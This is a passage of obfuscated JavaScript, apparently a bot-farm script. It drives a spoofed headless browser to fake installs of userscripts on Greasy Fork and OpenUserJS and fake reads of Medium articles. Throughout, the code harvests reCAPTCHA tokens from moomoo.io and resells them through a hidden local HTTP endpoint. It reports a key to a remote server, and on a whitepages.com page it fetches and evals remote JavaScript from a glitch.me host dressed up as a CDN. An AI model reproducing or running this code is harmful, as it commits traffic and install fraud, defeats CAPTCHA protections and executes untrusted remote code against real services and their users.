      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + W(0x3),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + W(0x1a) + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + V(0x9, '%(uw') + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + V(0xd, '4fPl') + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + V(0x1, '6kS1') + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + V(0x17, 's]ky'),
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x2 * -0x4e4 + 0x2679 + -0x71 * 0x41
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xb * 0xa3 + 0x3 * -0x1c5 + 0xc50)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log(Y(0x1b) + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1945 + -0x916 + -0xfcb), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x16a0 + 0x1d * 0x115 + -0x359d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x16e7 + -0x4c9 + -0x2 * 0x90f;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1078 + -0x1df3 + 0xd7b; w < getRandomInt(0x1f4e + -0xc * 0x322 + 0x64b, 0xd9 + 0xf73 + -0x1047); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x2645 * -0x1 + 0x10d * 0x4f + 0xbda2);
        }
      }();
    }, 0x1 * -0x42d + 0x203e + 0x1 * -0x1bad), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x66 * 0x36 + 0xbc * 0x25 + 0x4c * -0xa4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1d2b + -0xd2a + -0x1001, 0x1 * -0x4d6 + 0x2066 + 0x1f * -0xe2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x9e60 + 0x1 * -0x5d12 + 0x33e2);
    }, 0x24b2 + 0x1a43 + 0x3e91 * -0x1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x88c + 0x1 * 0x1a3 + 0x6e9;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x6f7 + -0x3 * 0xa8f + 0x1 * 0x246e), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x655 + -0xc24 + 0x5cf), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x13e78a + 0xf6fe + 0x260f8 * -0x3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * 0xaa9 + -0x23e * 0x8 + -0xd * -0x97);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x860 + -0x50b * -0x3 + -0x33f * 0x7);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x2a4 * -0xd + 0xed6 + 0x2 * -0x8cd);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c,
    a0 = d,
    Z = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1a * -0x179 + 0x22ed + -0x2 * -0x1af) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x28 * -0xad + 0xbc * -0x2 + 0x1c81));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x26b * -0x2 + 0x8a6 + 0x1 * -0x3d0, D['indexOf']('\x20'));
        return B ? E['slice'](0x135a + 0x1 * 0x14b3 + -0x280d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x3519 * 0x1 + -0x2295 + -0x7ebe * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x275a * 0x1 + 0x493 * -0xd + 0x3b2d),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + Z(0x2, '[YFc') + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0x0) + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + a1(0xf) + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + Z(0xc, 'F$MS') + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + a0(0xa) + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
